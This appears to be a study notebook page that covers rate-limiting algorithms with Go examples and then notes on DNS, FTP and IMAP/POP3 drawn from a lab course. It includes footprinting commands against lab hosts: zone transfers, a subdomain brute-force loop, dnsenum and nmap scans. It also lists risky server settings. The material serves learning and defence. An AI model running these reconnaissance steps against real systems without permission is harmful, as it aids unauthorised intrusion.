<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory Map</a></h2>
<ul>
<li><a href="#fixed-window-counter-algorithm">fixed-window-counter</a></li>
<li><a href="#leaking-bucket-algorithm">leaking-bucket</a></li>
<li><a href="#token-bucket-algorithm">token-bucket</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="fixed-window-counter-algorithm"><a class="header" href="#fixed-window-counter-algorithm">Fixed Window Counter Algorithm</a></h1>
<p>The algorithm divides a timeline into fixed-size windows and assign a counter to each window. Each request increments the counter by 1. Once the counter reaches the pre-defined threshold, future requests are dropped until a new time window starts.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="leaking-bucket-algorithm"><a class="header" href="#leaking-bucket-algorithm">Leaking Bucket Algorithm</a></h1>
<p>Similar to a token bucket except that requests are processed at a fixed rate. It is usually implemented with a queue (FIFO).</p>
<p>When a request arrives, the system checks if the queue is full. If it is not full, the request is added to the queue. Otherwise, the request is dropped. Requests are pulled from the queue and processed at regular intervals.</p>
<p>Leaking Bucket algorithm takes two parameters; Bucket size (usually equal to the queue size) and Outflow rate (how many requests can be processed per second).</p>
<pre><code class="language-go">package main

import (
	"sync"
	"time"
)

type LeakyBucket struct {
	capacity    int64
	remaining   int64
	leakRate    time.Duration
	lastLeak    time.Time
	mu          sync.Mutex
}

func NewLeakyBucket(capacity int64, leakRate time.Duration) *LeakyBucket {
	return &amp;LeakyBucket{
		capacity:  capacity,
		remaining: capacity,
		leakRate:  leakRate,
		lastLeak:  time.Now(),
	}
}

func (b *LeakyBucket) TryTake(n int64) bool {
	b.mu.Lock()
	defer b.mu.Unlock()

	// Calculate the time since the last leak
	now := time.Now()
	leaked := int64(now.Sub(b.lastLeak) / b.leakRate)

	// Update the bucket's current state
	if leaked &gt; 0 {
		if leaked &gt;= b.remaining {
			b.remaining = b.capacity
		} else {
			b.remaining += leaked
		}
		b.lastLeak = now
	}

	// Try to take n from the bucket
	if n &gt; b.remaining {
		return false
	}
	b.remaining -= n
	return true
}

func main() {
	bucket := NewLeakyBucket(10, time.Second)
	for {
		if bucket.TryTake(1) {
			println("Took 1 from the bucket")
		} else {
			println("Bucket is empty, waiting...")
		}
		time.Sleep(100 * time.Millisecond)
	}
}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="token-bucket-algorithm"><a class="header" href="#token-bucket-algorithm">TOKEN BUCKET ALGORITHM</a></h1>
<p>The token bucket rate limiting algorithm is a popular method for rate limiting, used by companies like Amazon and Stripe.</p>
<p>A token bucket is a container that has a pre-defined capacity. Tokens are put in the bucket at preset rates periodically. Once the bucket is full, no more tokens are added. Each request consumes one token. When a request arrives, we first check if there are available tokens in the bucket. If there are no tokens available, the request is denied.</p>
<p>The token bucket algorithm takes two parameters. Bucket size (the number of tokens the bucket can store) and refill rate (number of tokens put into the bucket every second).</p>
<h3 id="example-5"><a class="header" href="#example-5">Example:</a></h3>
<pre><code class="language-go">package main

import (
	"fmt"
	"sync"
	"time"
)

// TokenBucket represents a token bucket rate limiter
type TokenBucket struct {
	tokens           int
	capacity         int
	tokenRate        time.Duration
	lastRefill       time.Time
	mu               sync.Mutex
}

// NewTokenBucket creates a new token bucket
func NewTokenBucket(capacity int, refillRate time.Duration) *TokenBucket {
	return &amp;TokenBucket{
		tokens:           capacity,
		capacity:         capacity,
		tokenRate:        refillRate,
		lastRefill:       time.Now(),
	}
}

// refill refills tokens in the bucket based on the elapsed time since the last refill
func (tb *TokenBucket) refill() {
	now := time.Now()
	elapsed := now.Sub(tb.lastRefill)
	tokensToAdd := int(elapsed / tb.tokenRate)
	if tokensToAdd &gt; 0 {
		tb.tokens = min(tb.capacity, tb.tokens+tokensToAdd)
		tb.lastRefill = now
	}
}

// Consume consumes a token from the bucket if available
func (tb *TokenBucket) Consume() bool {
	tb.mu.Lock()
	defer tb.mu.Unlock()

	tb.refill()
	if tb.tokens &gt; 0 {
		tb.tokens--
		return true
	}
	return false
}

func min(a, b int) int {
	if a &lt; b {
		return a
	}
	return b
}

func main() {
	tb := NewTokenBucket(10, time.Second)  // Capacity of 10 tokens, and refills 1 token every second

	// Simulating rapid requests
	for i := 0; i &lt; 15; i++ {
		if tb.Consume() {
			fmt.Println("Request", i, "allowed")
		} else {
			fmt.Println("Request", i, "denied")
		}
		time.Sleep(500 * time.Millisecond)
	}
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="protocols-1"><a class="header" href="#protocols-1">Protocols</a></h1>
<h2 id="directory-map-23"><a class="header" href="#directory-map-23">Directory Map</a></h2>
<ul>
<li><a href="#dns-2">dns</a></li>
<li><a href="#ftp">ftp</a></li>
<li><a href="#icmp">icmp</a></li>
<li><a href="#imap--pop3">imap/pop3</a></li>
<li><a href="#mqtt">mqtt</a></li>
<li><a href="#nfs-network-file-system">nfs</a></li>
<li><a href="#ntp">ntp</a></li>
<li><a href="#quic">quic</a></li>
<li><a href="#server-message-block-smb">smb</a></li>
<li><a href="#smtp-simple-mail-transfer-protocol">smtp</a></li>
<li><a href="#snmp">snmp</a></li>
<li><a href="#ssh">ssh</a></li>
<li><a href="#tls">tls</a></li>
<li><a href="#udp-1">udp</a></li>
<li><a href="networking/protocols/websocket.html">websocket</a></li>
<li><a href="#ipmi">IPMI</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dns-2"><a class="header" href="#dns-2">DNS</a></h1>
<p>Domain Name System (DNS) is an integral part of the Internet that resolves computer names into IP addresses. DNS is a distributed system without a central database, functioning like a library with many different phone books. The information is distributed over many thousands of name servers globally. DNS servers translate domain names into IP addresses and control which server a user can reach via a particular domain. DNS also stores additional information about services associated with a domain, such as mail servers and name servers.</p>
<h2 id="dns-server-types"><a class="header" href="#dns-server-types">DNS Server Types</a></h2>
<ul>
<li><strong>DNS Root Server</strong>: Responsible for top-level domains (TLD). There are 13 root servers globally, coordinated by ICANN. They serve as the central interface between users and content on the Internet.</li>
<li><strong>Authoritative Nameserver</strong>: Holds authority for a particular zone and only answers queries from their area of responsibility. Their information is binding.</li>
<li><strong>Non-authoritative Nameserver</strong>: Not responsible for a particular DNS zone. They collect information on specific DNS zones using recursive or iterative DNS querying.</li>
<li><strong>Caching DNS Server</strong>: Caches information from other name servers for a specified period determined by the authoritative name server.</li>
<li><strong>Forwarding Server</strong>: Performs only one function: forwards DNS queries to another DNS server.</li>
<li><strong>Resolver</strong>: Not an authoritative DNS server but performs name resolution locally in the computer or router.</li>
</ul>
<h2 id="dns-encryption"><a class="header" href="#dns-encryption">DNS Encryption</a></h2>
<p>DNS is mainly unencrypted, which means devices on the local WLAN and Internet providers can intercept and spy on DNS queries. This poses a privacy risk. Solutions for DNS encryption include:</p>
<ul>
<li><strong>DNS over TLS (DoT)</strong>: Encrypts DNS traffic using TLS</li>
<li><strong>DNS over HTTPS (DoH)</strong>: Encrypts DNS traffic using HTTPS</li>
<li><strong>DNSCrypt</strong>: A network protocol that encrypts traffic between the computer and the name server</li>
</ul>
<h2 id="dns-records"><a class="header" href="#dns-records">DNS Records</a></h2>
<p>Different DNS records are used for DNS queries, each serving various tasks:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Record</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>A</td><td>Returns an IPv4 address of the requested domain</td></tr>
<tr><td>AAAA</td><td>Returns an IPv6 address of the requested domain</td></tr>
<tr><td>MX</td><td>Returns the responsible mail servers</td></tr>
<tr><td>NS</td><td>Returns the DNS servers (nameservers) of the domain</td></tr>
<tr><td>TXT</td><td>Contains various information (e.g., Google Search Console validation, SSL certificate validation, SPF and DMARC entries for mail traffic)</td></tr>
<tr><td>PTR</td><td>Used for reverse translation of IP addresses into names</td></tr>
<tr><td>CNAME</td><td>Creates an alias from one domain name to another</td></tr>
<tr><td>SOA</td><td>Start of Authority record containing administrative information about the zone</td></tr>
</tbody>
</table>
</div>
<h2 id="domain-hierarchy"><a class="header" href="#domain-hierarchy">Domain Hierarchy</a></h2>
<p>The DNS hierarchy consists of:</p>
<ul>
<li><strong>Root</strong>: The top level of the DNS hierarchy</li>
<li><strong>Top Level Domains (TLD)</strong>: Examples include <code>.net</code>, <code>.org</code>, <code>.com</code>, <code>.dev</code>, <code>.io</code></li>
<li><strong>Second Level Domain</strong>: Example: <code>inlanefreight.com</code></li>
<li><strong>Sub-Domains</strong>: Examples: <code>dev.inlanefreight.com</code>, <code>www.inlanefreight.com</code>, <code>mail.inlanefreight.com</code></li>
<li><strong>Host</strong>: Example: <code>WS01.dev.inlanefreight.com</code></li>
</ul>
<h2 id="zone-files"><a class="header" href="#zone-files">Zone Files</a></h2>
<p>Zone files contain forward records in BIND format, allowing the DNS server to identify which domain, hostname, and role IP addresses belong to. This is essentially the phone book where the DNS server looks up addresses for domains.</p>
<p>Example forward zone file:</p>
<pre><code class="language-bash">root@bind9:~# cat /etc/bind/db.domain.com

;
; BIND reverse data file for local loopback interface
;
$ORIGIN domain.com
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

      IN     MX     10     mx.domain.com.
      IN     MX     20     mx2.domain.com.

             IN     A       10.129.14.5

server1      IN     A       10.129.14.5
server2      IN     A       10.129.14.7
ns1          IN     A       10.129.14.2
ns2          IN     A       10.129.14.3

ftp          IN     CNAME   server1
mx           IN     CNAME   server1
mx2          IN     CNAME   server2
www          IN     CNAME   server2
</code></pre>
<h2 id="reverse-name-resolution"><a class="header" href="#reverse-name-resolution">Reverse Name Resolution</a></h2>
<p>For Fully Qualified Domain Name (FQDN) to be resolved from an IP address, the DNS server must have a reverse lookup file. PTR records are responsible for the reverse translation of IP addresses into names. In this file, the computer name (FQDN) is assigned to the last octet of an IP address using a PTR record.</p>
<p>Example reverse zone file:</p>
<pre><code class="language-bash">root@bind9:~# cat /etc/bind/db.10.129.14

;
; BIND reverse data file for local loopback interface
;
$ORIGIN 14.129.10.in-addr.arpa
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

5    IN     PTR    server1.domain.com.
7    IN     MX     mx.domain.com.
</code></pre>
<h2 id="zone-transfers"><a class="header" href="#zone-transfers">Zone Transfers</a></h2>
<p>A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. This process is essential for maintaining consistency and redundancy across DNS servers. However, if not adequately secured, unauthorised parties can download the entire zone file, revealing a complete list of subdomains, their associated IP addresses, and other sensitive DNS data.</p>
<p>In practice, additional servers called secondary name servers are installed for redundancy. For some Top-Level Domains (TLDs), making zone files accessible on at least two servers is mandatory. DNS entries are generally only created, modified, or deleted on the primary server. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. The slave fetches the SOA record of the relevant zone from the master at certain intervals (refresh time, usually one hour) and compares serial numbers.</p>
<h4 id="how-it-works-1"><a class="header" href="#how-it-works-1">How it works:</a></h4>
<ol>
<li>Zone Transfer Request (AXFR): The secondary DNS server initiates the process by sending a zone transfer request to the primary server. This request typically uses the AXFR (Full Zone Transfer) type.</li>
<li>SOA Record Transfer: Upon receiving the request (and potentially authenticating the secondary server), the primary server responds by sending its Start of Authority (SOA) record. The SOA record contains vital information about the zone, including its serial number, which helps the secondary server determine if its zone data is current.</li>
<li>DNS Records Transmission: The primary server then transfers all the DNS records in the zone to the secondary server, one by one. This includes records like A, AAAA, MX, CNAME, NS, and others that define the domain‚Äôs subdomains, mail servers, name servers, and other configurations.</li>
<li>Zone Transfer Complete: Once all records have been transmitted, the primary server signals the end of the zone transfer. This notification informs the secondary server that it has received a complete copy of the zone data.</li>
<li>Acknowledgement (ACK): The secondary server sends an acknowledgement message to the primary server, confirming the successful receipt and processing of the zone data. This completes the zone transfer process.</li>
</ol>
<h4 id="attempting-a-zone-transfer"><a class="header" href="#attempting-a-zone-transfer">Attempting a zone transfer</a></h4>
<pre><code class="language-bash">rtn@xerxes[/]$ dig axfr @nsztm1.digi.ninja zonetransfer.me
</code></pre>
<p><strong>zonetransfer.me is a special service designed to demonstrate zone transfers</strong></p>
<h2 id="dangerous-settings-2"><a class="header" href="#dangerous-settings-2">Dangerous Settings</a></h2>
<p>DNS servers can be vulnerable to attacks. Some dangerous settings that can lead to vulnerabilities include:</p>
<ul>
<li><strong>allow-query</strong>: Defines which hosts are allowed to send requests to the DNS server</li>
<li><strong>allow-recursion</strong>: Defines which hosts are allowed to send recursive requests to the DNS server</li>
<li><strong>allow-transfer</strong>: Defines which hosts are allowed to receive zone transfers from the DNS server. If set to <code>any</code> or a broad subnet, anyone can query the entire zone file, potentially exposing internal IP addresses and hostnames</li>
<li><strong>zone-statistics</strong>: Collects statistical data of zones</li>
</ul>
<h2 id="footprinting-dns-services"><a class="header" href="#footprinting-dns-services">Footprinting DNS Services</a></h2>
<h3 id="querying-name-servers"><a class="header" href="#querying-name-servers">Querying Name Servers</a></h3>
<p>DNS servers can be queried to discover which other name servers are known using the NS record:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128
</code></pre>
<h3 id="zone-transfer-axfr"><a class="header" href="#zone-transfer-axfr">Zone Transfer (AXFR)</a></h3>
<p>Zone transfers can reveal all DNS records for a domain. If <code>allow-transfer</code> is misconfigured, an attacker can retrieve the entire zone file:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128

; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr inlanefreight.htb @10.129.14.128
;; global options: +cmd
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
internal.inlanefreight.htb. 604800 IN   A       10.129.1.6
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
</code></pre>
<h3 id="subdomain-brute-forcing"><a class="header" href="#subdomain-brute-forcing">Subdomain Brute Forcing</a></h3>
<p>Individual A records with hostnames can be discovered through brute-force attacks using wordlists (such as those from SecLists):</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
</code></pre>
<p>Tools like <code>dnsenum</code> can automate this process:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ftp"><a class="header" href="#ftp">FTP</a></h1>
<p>FTP is a layer 7 application protocol and is one of the oldest protocols used on the internet. It is used for transferring files between a client and a server over a TCP/IP network. FTP operates on two separate channels: a command channel for sending commands and a data channel for transferring files.</p>
<h1 id="how-ftp-works"><a class="header" href="#how-ftp-works">How FTP Works</a></h1>
<ul>
<li>FTP uses a client-server architecture, where the client initiates a connection to the server. The client sends commands to the server over the command channel, and the server responds with status codes and messages. When a file transfer is initiated, a separate data channel is established for transferring the file.</li>
<li>FTP supports two modes of operation: active and passive. In active mode, the client opens a random port and sends the port number to the server, which then connects back to the client on that port for data transfer. In passive mode, the server opens a random port and sends the port number to the client, which then connects to the server on that port for data transfer. Passive mode is often used when the client is behind a firewall or NAT.</li>
<li>FTP uses tcp/21 for control (commands) and tcp/20 for data transfer in active mode. In passive mode, the data port is dynamically assigned by the server.</li>
<li>The FTP protocol supports a number of commands. However, not all implementations support all commands. With each command sent by the client, the server will respond with a status code (similar to HTTP). The status codes can be viewed here: https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes</li>
<li>FTP transmits data in plaintext, which means that all data, including usernames and passwords, are sent unencrypted. This makes FTP vulnerable to eavesdropping.</li>
</ul>
<h2 id="login"><a class="header" href="#login">Login</a></h2>
<ul>
<li>Upon connecting the FTP server, we will be prompted to provide a username and password (assuming anonymous auth is disabled). After providing the correct username/password combination, the FTP server will respond with a status code 230, along with the banner of the server (if one exists).</li>
</ul>
<pre><code class="language-bash">ftp&gt; user rtn
331 Please specify the password.
Password:
230 Login successful.
</code></pre>
<ul>
<li>After authenticating, one of the first things we can do is check the status of the server:</li>
</ul>
<pre><code class="language-bash">ftp&gt; status

Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off
</code></pre>
<h1 id="vsftpd"><a class="header" href="#vsftpd">vsFTPd</a></h1>
<ul>
<li>vsFTPd (Very Secure FTP Daemon) is a popular open-source FTP server for Unix-like systems. It is known for its security features and performance. vsFTPd supports both active and passive modes of FTP and provides various configuration options to enhance security, such as SSL/TLS encryption, user authentication, and access control.</li>
<li>The default configuration for vsFTPd can typically be found at <code>/etc/vsftpd.conf</code></li>
<li><code>/etc/ftpusers</code> is a file that contains a list of users who are not allowed to log in to the FTP server. If a username is listed in this file, the user will be denied access to the FTP server, regardless of their password or other authentication methods.</li>
</ul>
<pre><code class="language-bash">rtn@ns1:~$ cat /etc/ftpusers
# /etc/ftpusers: list of users disallowed FTP access. See ftpusers(5).

root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
nobody
</code></pre>
<h1 id="footprinting-ftp-services"><a class="header" href="#footprinting-ftp-services">Footprinting FTP Services</a></h1>
<p><code>nmap</code> is an excellent tool for footprinting remote FTP servers. We can use its built-in scripting engine (and ready-made scripts) to help interrogate a potential FTP service.</p>
<ul>
<li>First, we‚Äôll want to update the <code>nmap</code> scripting database:</li>
</ul>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap --script-updatedb

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:49 CEST
NSE: Updating rule database.
NSE: Script Database updated successfully.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds
</code></pre>
<ul>
<li><code>nmap</code> scripts are typically located in <code>/usr/share/nmap/scripts/</code></li>
<li>Example run of <code>nmap</code> against an FTP server:</li>
</ul>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST
Nmap scan report for 10.129.14.136
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]
| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]
| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="icmp"><a class="header" href="#icmp">ICMP</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="imap--pop3"><a class="header" href="#imap--pop3">IMAP / POP3</a></h1>
<p>With the help of the Internet Message Access Protocol (IMAP), access to emails from a mail server is possible. Unlike the Post Office Protocol (POP3), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.</p>
<h2 id="how-imap-works"><a class="header" href="#how-imap-works">How IMAP Works</a></h2>
<ul>
<li>Clients access these structures online and can create local copies. Even across several clients, this results in a uniform database. Emails remain on the server until they are deleted.</li>
<li>IMAP is text-based and has extended functions, such as browsing emails directly on the server. It is also possible for several users to access the email server simultaneously.</li>
<li>Without an active connection to the server, managing emails is impossible. However, some clients offer an offline mode with a local copy of the mailbox. The client synchronizes all offline local changes when a connection is reestablished.</li>
<li>The client establishes the connection to the server via port 143. For communication, it uses text-based commands in ASCII format. Several commands can be sent in succession without waiting for confirmation from the server. Later confirmations from the server can be assigned to the individual commands using the identifiers sent along with the commands.</li>
<li>Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.</li>
<li>SMTP is usually used to send emails. By copying sent emails into an IMAP folder, all clients have access to all sent mails, regardless of the computer from which they were sent.</li>
<li>Another advantage of the Internet Message Access Protocol is creating personal folders and folder structures in the mailbox. This feature makes the mailbox clearer and easier to manage. However, the storage space requirement on the email server increases.</li>
</ul>
<h2 id="security-1"><a class="header" href="#security-1">Security</a></h2>
<ul>
<li>Without further measures, IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plain text. Many email servers require establishing an encrypted IMAP session to ensure greater security in email traffic and prevent unauthorized access to mailboxes.</li>
<li>SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port 143 or an alternative port such as 993.</li>
</ul>
<h2 id="default-configuration-3"><a class="header" href="#default-configuration-3">Default Configuration</a></h2>
<p>Both IMAP and POP3 have a large number of configuration options, making it difficult to deep dive into each component in more detail. If you wish to examine these protocol configurations deeper, we recommend creating a VM locally and install the two packages <code>dovecot-imapd</code>, and <code>dovecot-pop3d</code> using apt and play around with the configurations and experiment.</p>
<p>In the documentation of Dovecot, we can find the individual core settings and service configuration options that can be utilized for our experiments. However, let us look at the list of commands and see how we can directly interact and communicate with IMAP and POP3 using the command line.</p>
<h2 id="imap-commands"><a class="header" href="#imap-commands">IMAP Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>LOGIN username password</td><td>User‚Äôs login.</td></tr>
<tr><td>LIST ‚Äú‚Äù *</td><td>Lists all directories.</td></tr>
<tr><td>CREATE ‚ÄúINBOX‚Äù</td><td>Creates a mailbox with a specified name.</td></tr>
<tr><td>DELETE ‚ÄúINBOX‚Äù</td><td>Deletes a mailbox.</td></tr>
<tr><td>RENAME ‚ÄúToRead‚Äù ‚ÄúImportant‚Äù</td><td>Renames a mailbox.</td></tr>
<tr><td>LSUB ‚Äú‚Äù *</td><td>Returns a subset of names from the set of names that the User has declared as being active or subscribed.</td></tr>
<tr><td>SELECT INBOX</td><td>Selects a mailbox so that messages in the mailbox can be accessed.</td></tr>
<tr><td>UNSELECT INBOX</td><td>Exits the selected mailbox.</td></tr>
<tr><td>FETCH <id> all</id></td><td>Retrieves data associated with a message in the mailbox.</td></tr>
<tr><td>CLOSE</td><td>Removes all messages with the Deleted flag set.</td></tr>
<tr><td>LOGOUT</td><td>Closes the connection with the IMAP server.</td></tr>
</tbody>
</table>
</div>
<h2 id="pop3-commands"><a class="header" href="#pop3-commands">POP3 Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>USER username</td><td>Identifies the user.</td></tr>
<tr><td>PASS password</td><td>Authentication of the user using its password.</td></tr>
<tr><td>STAT</td><td>Requests the number of saved emails from the server.</td></tr>
<tr><td>LIST</td><td>Requests from the server the number and size of all emails.</td></tr>
<tr><td>RETR id</td><td>Requests the server to deliver the requested email by ID.</td></tr>
<tr><td>DELE id</td><td>Requests the server to delete the requested email by ID.</td></tr>
<tr><td>CAPA</td><td>Requests the server to display the server capabilities.</td></tr>
<tr><td>RSET</td><td>Requests the server to reset the transmitted information.</td></tr>
<tr><td>QUIT</td><td>Closes the connection with the POP3 server.</td></tr>
</tbody>
</table>
</div>
<h2 id="dangerous-settings-3"><a class="header" href="#dangerous-settings-3">Dangerous Settings</a></h2>
<p>Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Setting</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>auth_debug</td><td>Enables all authentication debug logging.</td></tr>
<tr><td>auth_debug_passwords</td><td>This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.</td></tr>
<tr><td>auth_verbose</td><td>Logs unsuccessful authentication attempts and their reasons.</td></tr>
<tr><td>auth_verbose_passwords</td><td>Passwords used for authentication are logged and can also be truncated.</td></tr>
<tr><td>auth_anonymous_username</td><td>This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.</td></tr>
</tbody>
</table>
</div>
<h2 id="footprinting-the-service-1"><a class="header" href="#footprinting-the-service-1">Footprinting the Service</a></h2>
<p>By default, ports 110 and 995 are used for POP3, and ports 143 and 993 are used for IMAP. The higher ports (993 and 995) use TLS/SSL to encrypt the communication between the client and server. Using Nmap, we can scan the server for these ports. The scan will return the corresponding information (as seen below) if the server uses an embedded certificate.</p>
<h3 id="nmap"><a class="header" href="#nmap">Nmap</a></h3>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 22:09 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00026s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
995/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results to https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
</code></pre>
<p>For example, from the output, we can see that the common name is <code>mail1.inlanefreight.htb</code>, and the email server belongs to the organization Inlanefreight, which is located in California. The displayed capabilities show us the commands available on the server and for the service on the corresponding port.</p>
<p>If we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages.</p>
<h3 id="curl"><a class="header" href="#curl">cURL</a></h3>
